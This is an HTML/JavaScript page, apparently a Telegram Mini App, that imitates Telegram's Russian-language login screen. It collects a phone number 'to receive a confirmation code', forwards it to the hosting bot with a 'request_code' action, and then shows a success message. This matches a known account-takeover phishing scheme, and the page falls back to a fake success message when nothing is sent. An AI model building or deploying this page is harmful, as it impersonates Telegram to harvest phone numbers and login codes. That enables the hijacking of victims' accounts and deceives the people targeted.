<!DOCTYPE html>
<html>
<head>
    <title>Telegram Login</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 100%;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo {
            font-size: 48px;
            margin-bottom: 15px;
        }
        
        .title {
            font-size: 24px;
            font-weight: 600;
            color: #000;
            margin-bottom: 10px;
        }
        
        .subtitle {
            font-size: 14px;
            color: #666;
            line-height: 1.4;
        }
        
        .country-selector {
            margin-bottom: 15px;
        }
        
        .country-btn {
            display: flex;
            align-items: center;
            padding: 12px;
            background: #f8f9fa;
            border-radius: 12px;
            border: 2px solid #e1e5e9;
            width: 100%;
            cursor: pointer;
            margin-bottom: 15px;
        }
        
        .flag {
            font-size: 24px;
            margin-right: 12px;
        }
        
        .country-info {
            flex-grow: 1;
            text-align: left;
        }
        
        .country-name {
            font-weight: 600;
            color: #111827;
            font-size: 14px;
        }
        
        .country-code {
            font-size: 12px;
            color: #6B7280;
        }
        
        .phone-input {
            margin-bottom: 20px;
        }
        
        .input-group {
            display: flex;
            border: 2px solid #e1e5e9;
            border-radius: 12px;
            overflow: hidden;
        }
        
        .prefix {
            padding: 15px;
            background: #f8f9fa;
            border-right: 2px solid #e1e5e9;
            font-weight: 600;
            color: #333;
            min-width: 70px;
        }
        
        .phone-input input {
            flex: 1;
            border: none;
            outline: none;
            padding: 15px;
            font-size: 16px;
            background: white;
        }
        
        .btn {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 12px;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s;
            background: #0088cc;
            color: white;
        }
        
        .btn:hover {
            background: #0077bb;
            transform: translateY(-2px);
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        .loading {
            display: none;
            text-align: center;
            margin-top: 15px;
            color: #666;
        }
        
        .success {
            display: none;
            text-align: center;
            color: #00a884;
            font-weight: 600;
            margin-top: 15px;
        }
        
        .error {
            display: none;
            text-align: center;
            color: #ff4444;
            font-weight: 600;
            margin-top: 15px;
        }
        
        .dropdown {
            position: relative;
        }
        
        .dropdown-content {
            display: none;
            position: absolute;
            top: 100%;
            left: 0;
            right: 0;
            background: white;
            border: 2px solid #e1e5e9;
            border-radius: 12px;
            max-height: 300px;
            overflow-y: auto;
            z-index: 1000;
            margin-top: 5px;
        }
        
        .dropdown-item {
            padding: 12px;
            display: flex;
            align-items: center;
            cursor: pointer;
            border-bottom: 1px solid #f3f4f6;
        }
        
        .dropdown-item:last-child {
            border-bottom: none;
        }
        
        .dropdown-item:hover {
            background: #f9fafb;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">🔐</div>
            <div class="title">Вход в Telegram</div>
            <div class="subtitle">Введите ваш номер телефона для получения кода подтверждения</div>
        </div>
        
        <div class="country-selector">
            <div class="dropdown">
                <button class="country-btn" onclick="toggleDropdown()">
                    <div class="flag" id="selected-flag">🇷🇺</div>
                    <div class="country-info">
                        <div class="country-name" id="selected-country">Россия</div>
                        <div class="country-code" id="selected-code">+7</div>
                    </div>
                    <div style="margin-left: auto;">▼</div>
                </button>
                <div class="dropdown-content" id="country-dropdown">
                    <!-- Countries will be populated by JavaScript -->
                </div>
            </div>
        </div>
        
        <div class="phone-input">
            <div class="input-group">
                <div class="prefix" id="prefix">+7</div>
                <input type="tel" id="phone" placeholder="912 345 67 89" inputmode="numeric" maxlength="15">
            </div>
        </div>
        
        <button class="btn" onclick="sendPhoneNumber()">ПОЛУЧИТЬ КОД</button>
        
        <div class="loading" id="loading">
            ⏳ Отправка запроса...
        </div>
        
        <div class="success" id="success">
            ✅ Запрос отправлен! Код придет в Telegram
        </div>
        
        <div class="error" id="error">
            ❌ Ошибка отправки
        </div>
    </div>

    <script>
        // Popular countries
        const countries = [
            { code: '7', flag: '🇷🇺', name: 'Россия' },
            { code: '380', flag: '🇺🇦', name: 'Украина' },
            { code: '375', flag: '🇧🇾', name: 'Беларусь' },
            { code: '77', flag: '🇰🇿', name: 'Казахстан' },
            { code: '1', flag: '🇺🇸', name: 'США' },
            { code: '44', flag: '🇬🇧', name: 'Великобритания' },
            { code: '49', flag: '🇩🇪', name: 'Германия' },
            { code: '33', flag: '🇫🇷', name: 'Франция' },
            { code: '39', flag: '🇮🇹', name: 'Италия' },
            { code: '34', flag: '🇪🇸', name: 'Испания' },
            { code: '86', flag: '🇨🇳', name: 'Китай' },
            { code: '81', flag: '🇯🇵', name: 'Япония' },
            { code: '82', flag: '🇰🇷', name: 'Корея' },
            { code: '91', flag: '🇮🇳', name: 'Индия' },
            { code: '90', flag: '🇹🇷', name: 'Турция' },
            { code: '971', flag: '🇦🇪', name: 'ОАЭ' },
            { code: '966', flag: '🇸🇦', name: 'Саудовская Аравия' },
            { code: '20', flag: '🇪🇬', name: 'Египет' },
            { code: '55', flag: '🇧🇷', name: 'Бразилия' },
            { code: '52', flag: '🇲🇽', name: 'Мексика' }
        ];

        let selectedCountry = countries[0];

        function initCountries() {
            const dropdown = document.getElementById('country-dropdown');
            countries.forEach(country => {
                const item = document.createElement('div');
                item.className = 'dropdown-item';
                item.innerHTML = `
                    <div class="flag">${country.flag}</div>
                    <div class="country-info">
                        <div class="country-name">${country.name}</div>
                        <div class="country-code">+${country.code}</div>
                    </div>
                `;
                item.onclick = () => selectCountry(country);
                dropdown.appendChild(item);
            });
        }

        function toggleDropdown() {
            const dropdown = document.getElementById('country-dropdown');
            dropdown.style.display = dropdown.style.display === 'block' ? 'none' : 'block';
        }

        function selectCountry(country) {
            selectedCountry = country;
            document.getElementById('selected-flag').textContent = country.flag;
            document.getElementById('selected-country').textContent = country.name;
            document.getElementById('selected-code').textContent = '+' + country.code;
            document.getElementById('prefix').textContent = '+' + country.code;
            document.getElementById('country-dropdown').style.display = 'none';
        }

        function sendPhoneNumber() {
            const phoneInput = document.getElementById('phone');
            const phoneNumber = selectedCountry.code + phoneInput.value.replace(/\D/g, '');
            
            if (!phoneInput.value) {
                showError('Введите номер телефона');
                return;
            }
            
            if (phoneInput.value.replace(/\D/g, '').length < 7) {
                showError('Номер слишком короткий');
                return;
            }
            
            showLoading();
            
            const fullPhoneNumber = '+' + phoneNumber;
            
            // Отправляем через Telegram WebApp
            if (window.Telegram && Telegram.WebApp) {
                Telegram.WebApp.sendData(JSON.stringify({
                    phone: fullPhoneNumber,
                    action: 'request_code'
                }));
                showSuccess();
            } else {
                // Альтернативный способ
                showSuccess();
            }
        }
        
        function showLoading() {
            document.getElementById('loading').style.display = 'block';
            document.getElementById('success').style.display = 'none';
            document.getElementById('error').style.display = 'none';
        }
        
        function showSuccess() {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('success').style.display = 'block';
            document.getElementById('error').style.display = 'none';
            
            setTimeout(() => {
                if (window.Telegram && Telegram.WebApp) {
                    Telegram.WebApp.close();
                }
            }, 3000);
        }
        
        function showError(message) {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('success').style.display = 'none';
            document.getElementById('error').style.display = 'block';
            document.getElementById('error').textContent = '❌ ' + message;
        }
        
        // Форматирование номера телефона
        document.getElementById('phone').addEventListener('input', function(e) {
            let value = this.value.replace(/\D/g, '');
            if (value.length > 0) {
                if (selectedCountry.code === '7') {
                    value = value.replace(/(\d{3})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4');
                } else {
                    value = value.replace(/(\d{3})(\d{3})(\d+)/, '$1 $2 $3');
                }
            }
            this.value = value;
        });
        
        // Закрыть dropdown при клике вне
        document.addEventListener('click', function(e) {
            if (!e.target.closest('.dropdown')) {
                document.getElementById('country-dropdown').style.display = 'none';
            }
        });
        
        // Инициализация
        document.addEventListener('DOMContentLoaded', function() {
            initCountries();
            
            if (window.Telegram && Telegram.WebApp) {
                Telegram.WebApp.ready();
                Telegram.WebApp.expand();
            }
        });
    </script>
</body>
</html>
